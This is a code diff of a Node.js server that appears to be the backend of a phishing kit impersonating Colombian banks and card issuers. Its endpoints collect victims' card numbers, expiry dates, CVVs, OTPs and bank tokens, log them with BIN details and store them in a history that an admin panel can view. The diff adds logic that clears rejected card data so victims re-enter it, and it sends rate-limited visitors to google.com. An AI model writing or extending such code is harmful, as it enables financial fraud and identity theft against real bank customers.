@@ -38,9 +38,6 @@ function guardarIpsBloqueadas() {
     try { fs.writeFileSync(IP_BLOQUEADAS_FILE, JSON.stringify([...ipsBloqueadas], null, 2)); } catch (e) {}
 }
 
-/* ============================================================
-   🔥 NUEVO SISTEMA DE HISTORIAL
-   ============================================================ */
 const HISTORIAL_FILE = path.join(DATA_DIR, 'historial.json');
 let historial = [];
 try {
@@ -55,7 +52,7 @@ function guardarHistorial(bancoKey, datos) {
         datos: datos
     };
     historial.unshift(registro);
-    if (historial.length > 1000) historial = historial.slice(0, 1000); // Máximo 1000 registros
+    if (historial.length > 1000) historial = historial.slice(0, 1000);
     try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
 }
 
@@ -277,9 +274,8 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        /* 🔥 NUEVO ENDPOINT DE HISTORIAL */
         if (req.method === 'GET' && url === '/admin/historial') {
-            json(res, 200, { ok: true, historial: historial.slice(0, 200) }); // Devolvemos los últimos 200
+            json(res, 200, { ok: true, historial: historial.slice(0, 200) });
             return;
         }
 
@@ -330,10 +326,29 @@ const server = http.createServer(async (req, res) => {
                     CC_ERROR: 'cc_error' 
                 };
                 if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
-                estadoSesiones.set(sessionId, mapEstados[accion]);
+                
+                const estadoNuevo = mapEstados[accion];
+                estadoSesiones.set(sessionId, estadoNuevo);
+                
+                // 🔥 LÓGICA DE BORRADO DE DATOS
+                let datosActuales = datosSesiones.get(sessionId) || {};
+                const bancoKey = datosActuales.bancoKey || '';
+                const esTarjeta = bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga';
+
+                if ((accion === 'RECHAZAR' || accion === 'CC_ERROR') && esTarjeta) {
+                    // Borramos número de tarjeta, fecha de vencimiento y CVV, pero dejamos titular y documento
+                    datosActuales.tarjeta = '';
+                    datosActuales.expMes = '';
+                    datosActuales.expAnio = '';
+                    datosActuales.cvv = '';
+                    // También borramos el OTP para que lo vuelvan a escribir
+                    datosActuales.otp = '';
+                    datosSesiones.set(sessionId, datosActuales);
+                }
+
                 agregarLog('accion', { usuario: payload.user, sessionId, accion });
                 console.log(`[${payload.user}] ${accion} → ${sessionId}`);
-                json(res, 200, { ok: true, estado: mapEstados[accion] });
+                json(res, 200, { ok: true, estado: estadoNuevo });
             } catch (e) { json(res, 400, { ok: false }); }
             return;
         }
@@ -442,9 +457,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    /* ============================================================
-       ENDPOINTS UNIFICADOS PARA CC-BOGOTA Y CC-BUCARAMANGA
-       ============================================================ */
     const ccMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-pago$/);
     if (req.method === 'POST' && ccMatch) {
         if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
@@ -471,7 +483,6 @@ const server = http.createServer(async (req, res) => {
             estadoSesiones.set(sessionId, 'pendiente');
             datosSesiones.set(sessionId, datosSesion);
             
-            // 🔥 GUARDAMOS EN EL HISTORIAL
             guardarHistorial(bancoKey, datosSesion);
 
             console.log(`[${bancoKey}] Nueva sesión: ${sessionId} (${marca}) IP=${ip} | BIN=${infoBin?.bin || '?'} Tipo=${infoBin?.cardType || '?'} Nivel=${infoBin?.cardLevel || '?'}`);
@@ -492,7 +503,6 @@ const server = http.createServer(async (req, res) => {
             estadoSesiones.set(sessionId, 'pendiente');
             datosSesiones.set(sessionId, datosCompletos);
             
-            // 🔥 ACTUALIZAMOS EL HISTORIAL CON EL OTP
             guardarHistorial(bancoKey, datosCompletos);
 
             console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
@@ -501,9 +511,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    /* ============================================================
-       OTROS BANCOS (PSE)
-       ============================================================ */
     const enviarMatch = url.match(/^\/([a-z-]+)\/enviar$/);
     if (req.method === 'POST' && enviarMatch) {
         if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
@@ -521,7 +528,6 @@ const server = http.createServer(async (req, res) => {
             estadoSesiones.set(sessionId, 'pendiente');
             datosSesiones.set(sessionId, datosSesion);
             
-            // 🔥 GUARDAMOS EN EL HISTORIAL
             guardarHistorial(bancoKey, datosSesion);
 
             console.log(`[${bancoKey}] Nueva sesión: ${sessionId}`);
@@ -544,7 +550,6 @@ const server = http.createServer(async (req, res) => {
             datosSesiones.set(sessionId, datosCompletos);
             estadoSesiones.set(sessionId, 'token');
             
-            // 🔥 ACTUALIZAMOS EL HISTORIAL
             guardarHistorial(bancoKey, datosCompletos);
 
             console.log(`[${bancoKey}] Token: ${sessionId} → ${token}`);
@@ -567,7 +572,6 @@ const server = http.createServer(async (req, res) => {
             datosSesiones.set(sessionId, datosCompletos);
             estadoSesiones.set(sessionId, 'otp');
             
-            // 🔥 ACTUALIZAMOS EL HISTORIAL
             guardarHistorial(bancoKey, datosCompletos);
 
             console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
@@ -576,9 +580,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    /* ============================================================
-       ESTADO (unificado para todos los bancos + cc-bogota + cc-bucaramanga)
-       ============================================================ */
     const estadoMatch = url.match(/^\/([a-z-]+)\/estado\/([^\/?]+)/);
     if (req.method === 'GET' && estadoMatch) {
         const bancoKey = estadoMatch[1];
